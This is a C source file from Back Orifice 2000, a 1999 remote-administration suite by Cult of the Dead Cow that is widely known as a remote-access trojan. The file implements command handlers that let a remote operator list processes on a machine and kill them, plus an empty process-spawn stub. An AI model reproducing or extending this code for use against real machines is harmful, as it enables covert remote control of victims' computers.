/*  Back Orifice 2000 - Remote Administration Suite
    Copyright (C) 1999, Cult Of The Dead Cow

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

	The author of this program may be contacted at dildog@l0pht.com. */

#include<windows.h>
#include<auth.h>
#include<iohandler.h>
#include<encryption.h>
#include<commandloop.h>
#include<bocomreg.h>
#include<cmd\cmd_process.h>
#include<pviewer.h>
#include<strhandle.h>
	
int CmdProc_ProcessList(CAuthSocket *cas_from, int comid, DWORD nArg1, char *svArg2, char *svArg3)
{
	char svBuffer[1024];
	PROCESSINFO *pinfo,*cur;

	if(svArg2) if(svArg2[0]=='\0') svArg2=NULL;

	pinfo=CreateProcListSnapshot(svArg2);

	for(cur=pinfo;cur;cur=cur->next) {
		THREADINFO *pti;
		int nThreads;

		nThreads=0;
		for(pti=cur->pThread;pti;pti=pti->next) nThreads++;
	
		wsprintf(svBuffer,"(0x%X) %s  %d threads\n",cur->dwProcID,cur->svApp,nThreads);
		IssueAuthCommandReply(cas_from,comid,1,svBuffer);
	}

	IssueAuthCommandReply(cas_from,comid,0,"End process list\n");	
	DestroyProcListSnapshot(pinfo);
	
	return 0;
}

int CmdProc_ProcessKill(CAuthSocket *cas_from, int comid, DWORD nArg1, char *svArg2, char *svArg3)
{
	// Get pid string (hex)
	char *svPid;
	CharUpper(svArg2);
	svPid=BreakString(svArg2,"0X");
	if(svPid==NULL) svPid=svArg2;
	
	// Convert to dword
	DWORD dwPid;
	dwPid=0;
	while(*svPid) {
		char c;
		c=*svPid;

		if(c>='A' && c<='F') c=c-'A'+0xA;
		else if(c>='0' && c<='9') c-='0';
		else c=0;

		dwPid<<=4;
		dwPid|=c;

		svPid++;
	}
	
	// Open process handle
	HANDLE hProc;
	hProc=OpenProcess(PROCESS_TERMINATE,FALSE,dwPid);
	if(hProc==NULL) {
		IssueAuthCommandReply(cas_from,comid,0,"Could not access process.\n");
		return -1;
	}
	if(TerminateProcess(hProc,0)==0) {
		IssueAuthCommandReply(cas_from,comid,0,"Could not terminate process.\n");
		return -1;
	}

	IssueAuthCommandReply(cas_from,comid,0,"Process terminated.\n");
	
	return 0;
}

int CmdProc_ProcessSpawn(CAuthSocket *cas_from, int comid, DWORD nArg1, char *svArg2, char *svArg3)
{

	return 0;
}

